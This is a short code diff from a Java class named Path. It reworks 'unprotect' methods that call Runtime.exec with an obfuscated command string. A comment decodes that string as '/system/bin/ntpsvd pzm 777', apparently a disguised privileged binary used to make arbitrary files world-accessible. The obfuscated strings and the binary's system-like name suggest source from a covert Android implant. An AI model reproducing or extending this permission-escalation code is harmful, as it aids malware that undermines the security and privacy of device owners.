@@ -217,19 +217,13 @@ public class Path {
 	public static boolean unprotect(String path, int depth, boolean fullmode) {
 
 		File file = new File(path);
-		if (file.exists()) {
-			if (depth > 0) {
-				unprotect(file.getParent(), depth - 1, fullmode);
-			}
-
-			return unprotect(path, fullmode);
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (unprotect) File does not exists: " + path);
-			}
-			return false;
+	
+		if (depth > 0) {
+			unprotect(file.getParent(), depth - 1, fullmode);
 		}
-
+		
+		return unprotect(path, fullmode);
+	
 	}
 
 	public static boolean unprotect(String path, boolean fullmode) {
@@ -238,7 +232,7 @@ public class Path {
 			File file = new File(path);
 
 			if (fullmode) {
-				if (file.canRead() && file.canWrite()) {
+				if (file.exists() && file.canRead() && file.canWrite()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
@@ -247,7 +241,7 @@ public class Path {
 				// h_9=/system/bin/ntpsvd pzm 777
 				Runtime.getRuntime().exec(Messages.getString("h_9") + " " + path);
 			} else {
-				if (file.canRead()) {
+				if (file.exists() && file.canRead()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
